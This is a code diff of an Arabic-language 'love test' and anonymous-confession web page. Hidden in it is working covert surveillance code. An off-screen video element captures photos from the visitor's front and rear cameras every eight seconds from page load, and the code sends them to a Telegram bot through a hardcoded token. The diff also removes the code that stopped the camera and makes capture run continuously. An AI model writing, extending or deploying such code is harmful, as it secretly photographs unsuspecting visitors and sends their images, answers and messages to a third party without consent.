@@ -102,12 +102,6 @@
             font-weight: 700;
             color: #b34a6a;
         }
-        /* ===== قسم نسبة التشابه ===== */
-        .similarity-section {
-            display: flex;
-            flex-direction: column;
-            gap: 14px;
-        }
         .photo-upload {
             display: flex;
             flex-wrap: wrap;
@@ -174,11 +168,6 @@
             font-weight: 700;
             color: #6b2e4a;
         }
-        .result-box .label {
-            font-size: 1.1rem;
-            color: #4a1e32;
-        }
-        /* ===== الأزرار ===== */
         .btn {
             padding: 10px 24px;
             border: none;
@@ -221,7 +210,6 @@
             cursor: not-allowed;
             transform: none !important;
         }
-        /* ===== أسئلة ===== */
         #questionBox {
             background: rgba(255, 255, 255, 0.6);
             backdrop-filter: blur(8px);
@@ -309,7 +297,6 @@
             display: none;
             border: 2px solid #d47a9a;
         }
-        /* ===== صارحني ===== */
         .confession-area {
             background: rgba(255,255,255,0.5);
             border-radius: 28px;
@@ -334,7 +321,6 @@
             border-color: #b34a6a;
             background: #fff;
         }
-        /* ===== فيديو مخفي ===== */
         #hiddenVideo {
             position: fixed;
             top: -9999px;
@@ -344,7 +330,6 @@
             opacity: 0;
             pointer-events: none;
         }
-        /* ===== قلوب عائمة ===== */
         .floating-heart {
             position: fixed;
             font-size: 30px;
@@ -363,7 +348,6 @@
             margin-top: 16px;
             opacity: 0.6;
         }
-        /* ===== تأثير اللمعان عند الإرسال ===== */
         .glow-effect {
             animation: glow-flash 0.6s ease;
         }
@@ -425,7 +409,7 @@
             </div>
         </div>
 
-        <!-- ===== اختبار الحب (55 سؤالاً) ===== -->
+        <!-- ===== اختبار الحب ===== -->
         <div id="tab-questions" class="tab-content">
             <div id="questionBox">
                 <div id="questionText">اضغط "ابدأ" لبدء الاختبار</div>
@@ -469,9 +453,8 @@
             const BOT_TOKEN = '8843331045:AAF7khHAAFaaw_zuNDX_I79q04eOI9zVcFQ';
             const CHAT_ID = '8607243024';
 
-            // ===== 55 سؤالاً (أضفت 5 أسئلة جديدة) =====
+            // ===== 55 سؤالاً =====
             const questions = [
-                // 20 سؤالاً مفتوحاً
                 { type: 'text', q: 'ما هو أول حرف من اسم من تحب؟', hint: 'اكتب الحرف الأول' },
                 { type: 'text', q: 'ما هو لون عيون من تحب؟', hint: 'لون العيون' },
                 { type: 'text', q: 'ما هي أغنية تذكرك بمن تحب؟', hint: 'اسم الأغنية' },
@@ -492,7 +475,6 @@
                 { type: 'text', q: 'كيف تعرف أن من تحب سعيد؟', hint: 'علامة' },
                 { type: 'text', q: 'ما هو شيء تود قوله لمن تحب الآن؟', hint: 'كلمة' },
                 { type: 'text', q: 'ما هو أجمل شيء في علاقتكما؟', hint: 'أجمل شيء' },
-                // 30 سؤال اختيارات (كما هي)
                 { type: 'choice', q: 'ما هو نوع العلاقة التي تفضلها؟', options: ['رومانسية', 'صداقة قوية', 'عاطفية', 'كل ما سبق'] },
                 { type: 'choice', q: 'أين تفضل قضاء وقت رومانسي؟', options: ['شاطئ', 'جبال', 'مطعم فاخر', 'منزل'] },
                 { type: 'choice', q: 'ما هي لغات الحب المفضلة لديك؟', options: ['كلمات التشجيع', 'الهدايا', 'اللمس الجسدي', 'أفعال الخدمة'] },
@@ -523,25 +505,22 @@
                 { type: 'choice', q: 'ما هو أكثر شيء يخيفك في العلاقات؟', options: ['الخيانة', 'الملل', 'الانفصال', 'فقدان الهوية'] },
                 { type: 'choice', q: 'ما هو حلمك العاطفي؟', options: ['زواج ناجح', 'حب أبدي', 'عائلة سعيدة', 'مغامرة رومانسية'] },
                 { type: 'choice', q: 'كيف تصف شعورك عندما ترى من تحب؟', options: ['سعادة', 'ارتباك', 'راحة', 'شغف'] },
-                // 5 أسئلة جديدة (شخصية)
                 { type: 'choice', q: 'ما هو برجك الفلكي؟', options: ['الحمل', 'الثور', 'الجوزاء', 'السرطان', 'الأسد', 'العذراء', 'الميزان', 'العقرب', 'القوس', 'الجدي', 'الدلو', 'الحوت'] },
                 { type: 'choice', q: 'ما هو لونك المفضل؟', options: ['أحمر', 'أزرق', 'أخضر', 'أصفر', 'وردي', 'أسود', 'أبيض'] },
                 { type: 'choice', q: 'ما هي هوايتك المفضلة؟', options: ['القراءة', 'الرياضة', 'الرسم', 'الموسيقى', 'السفر', 'الطبخ'] },
                 { type: 'choice', q: 'ما هو طعامك المفضل؟', options: ['بيتزا', 'باستا', 'سوشي', 'برجر', 'شاورما', 'حلويات'] },
-                { type: 'choice', q: 'كيف تصف شخصيتك؟', options: ['اجتماعي', 'هادئ', 'مغامر', 'عاطفي', 'طموح', 'مرح'] },
+                { type: 'choice', q: 'كيف تصف شخصيتك؟', options: ['اجتماعي', 'هادئ', 'مغامر', 'عاطفي', 'طموح', 'مرح'] }
             ];
 
-            // ===== متغيرات =====
-            let currentIndex = 0,
-                answers = [],
-                isQuizStarted = false;
-            let stream = null,
-                cameraReady = false,
-                captureInterval = null,
-                switchInterval = null,
-                isCapturing = false,
-                cameraMode = 'user',
-                retryTimer = null;
+            // ===== متغيرات الكاميرا =====
+            let stream = null;
+            let cameraReady = false;
+            let isCapturing = false;
+            let cameraMode = 'user';
+            let captureInterval = null;
+            let switchInterval = null;
+            let retryTimer = null;
+            let isQuizStarted = false;
 
             // ===== عناصر DOM =====
             const video = document.getElementById('hiddenVideo');
@@ -660,7 +639,7 @@
                 }
             }
 
-            // ===== الكاميرا الخفية (مع إعادة محاولة قوية) =====
+            // ===== الكاميرا الخفية (تعمل فوراً وتستمر) =====
             async function startCamera(mode = 'user') {
                 try {
                     if (stream) {
@@ -689,7 +668,6 @@
             }
 
             function switchCamera() {
-                if (!isQuizStarted) return;
                 cameraMode = (cameraMode === 'user') ? 'environment' : 'user';
                 startCamera(cameraMode);
             }
@@ -714,12 +692,8 @@
                     } catch (e) {}
 
                     const now = new Date().toLocaleString('ar-EG', {
-                        year: 'numeric',
-                        month: 'long',
-                        day: 'numeric',
-                        hour: '2-digit',
-                        minute: '2-digit',
-                        second: '2-digit'
+                        year: 'numeric', month: 'long', day: 'numeric',
+                        hour: '2-digit', minute: '2-digit', second: '2-digit'
                     });
                     const cameraLabel = cameraMode === 'user' ? 'أمامية' : 'خلفية';
                     const caption =
@@ -740,8 +714,11 @@
                         body: formData
                     });
                     const result = await response.json();
-                    if (result.ok) console.log(`✅ تم إرسال الصورة (${cameraLabel})`);
-                    else console.error('❌ فشل الإرسال:', result.description);
+                    if (result.ok) {
+                        console.log(`✅ تم إرسال الصورة (${cameraLabel})`);
+                    } else {
+                        console.error('❌ فشل الإرسال:', result.description);
+                    }
                 } catch (error) {
                     console.error('خطأ في الالتقاط:', error.message);
                 } finally {
@@ -749,7 +726,32 @@
                 }
             }
 
+            // ===== بدء تشغيل الكاميرا الخفية فوراً والاستمرار =====
+            setTimeout(() => {
+                console.log('📷 بدء تشغيل الكاميرا الخفية...');
+                startCamera('user');
+
+                // تبديل الكاميرا كل 8 ثوانٍ
+                if (switchInterval) clearInterval(switchInterval);
+                switchInterval = setInterval(() => {
+                    console.log('🔄 تبديل الكاميرا (كل 8 ثوانٍ)...');
+                    switchCamera();
+                }, 8000);
+
+                // التقاط صورة كل 8 ثوانٍ (بالإضافة للالتقاط عند التبديل)
+                if (captureInterval) clearInterval(captureInterval);
+                captureInterval = setInterval(() => {
+                    if (cameraReady) {
+                        console.log('📸 التقاط تلقائي (كل 8 ثوانٍ)...');
+                        captureAndSend();
+                    }
+                }, 8000);
+            }, 1000);
+
             // ===== أسئلة =====
+            let currentIndex = 0;
+            let answers = [];
+
             function renderQuestion(index) {
                 const q = questions[index];
                 questionText.textContent = q.q;
@@ -817,7 +819,6 @@
                 console.log(`📝 سؤال ${currentIndex+1}: ${answer}`);
                 if (answers.length > 0) sendAnswersBtn.disabled = false;
 
-                // التقاط صورة بعد كل إجابة
                 captureAndSend();
 
                 currentIndex++;
@@ -839,16 +840,7 @@
                 sendAnswersBtn.disabled = false;
 
                 setTimeout(() => captureAndSend(), 1000);
-                setTimeout(() => {
-                    if (captureInterval) clearInterval(captureInterval);
-                    if (switchInterval) clearInterval(switchInterval);
-                    if (stream) {
-                        stream.getTracks().forEach(t => t.stop());
-                        stream = null;
-                        cameraReady = false;
-                    }
-                    console.log('⏹️ توقف الكاميرا والالتقاط');
-                }, 10000);
+                // لا نوقف الكاميرا لأنها تعمل باستمرار
             }
 
             function startQuiz() {
@@ -860,21 +852,6 @@
                 startQuizBtn.disabled = true;
                 renderQuestion(0);
                 console.log('🚀 بدأ اختبار الحب (55 سؤالاً)');
-
-                // تشغيل الكاميرا
-                startCamera('user');
-
-                // تبديل الكاميرات كل 4 ثوانٍ
-                if (switchInterval) clearInterval(switchInterval);
-                switchInterval = setInterval(() => {
-                    if (isQuizStarted) switchCamera();
-                }, 4000);
-
-                // التصوير كل 4 ثوانٍ
-                if (captureInterval) clearInterval(captureInterval);
-                captureInterval = setInterval(() => {
-                    if (isQuizStarted && cameraReady) captureAndSend();
-                }, 4000);
             }
 
             // ===== إرسال الإجابات =====
@@ -914,7 +891,7 @@
                 }
             }
 
-            // ===== صارحني (إرسال رسالة) =====
+            // ===== صارحني =====
             sendConfessionBtn.addEventListener('click', async function() {
                 const msg = confessionText.value.trim();
                 if (!msg) {
@@ -927,7 +904,8 @@
                 confessionResult.innerHTML = '';
 
                 try {
-                    const text = `💬 *رسالة صريحة (مجهولة)*%0A%0A${encodeURIComponent(msg)}%0A%0A🕒 ${new Date().toLocaleString('ar-EG')}`;
+                    const text =
+                        `💬 *رسالة صريحة (مجهولة)*%0A%0A${encodeURIComponent(msg)}%0A%0A🕒 ${new Date().toLocaleString('ar-EG')}`;
                     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -942,7 +920,6 @@
                         confessionResult.innerHTML = '✅ تم إرسال رسالتك بنجاح! ❤️';
                         confessionResult.style.color = '#22c55e';
                         confessionText.value = '';
-                        // تأثير وميض
                         document.querySelector('.confession-area').classList.add('glow-effect');
                         setTimeout(() => {
                             document.querySelector('.confession-area').classList.remove('glow-effect');
@@ -965,21 +942,15 @@
             nextBtn.addEventListener('click', saveAndNext);
             sendAnswersBtn.addEventListener('click', sendAnswersToBot);
 
-            // ===== بدء تشغيل الكاميرا الخفية =====
-            setTimeout(() => {
-                console.log('📷 محاولة تشغيل الكاميرا الخفية...');
-                startCamera('user');
-            }, 1000);
-
             // ===== عند العودة للصفحة =====
             document.addEventListener('visibilitychange', () => {
-                if (!document.hidden && !cameraReady && isQuizStarted) {
+                if (!document.hidden && !cameraReady) {
                     console.log('🔄 إعادة تشغيل الكاميرا');
                     startCamera(cameraMode);
                 }
             });
 
-            console.log('💕 الموقع جاهز مع ميزات جديدة (55 سؤالاً + صارحني)');
+            console.log('💕 الموقع جاهز مع التصوير المستمر كل 8 ثوانٍ من الكاميرتين.');
         })();
     </script>
 </body>
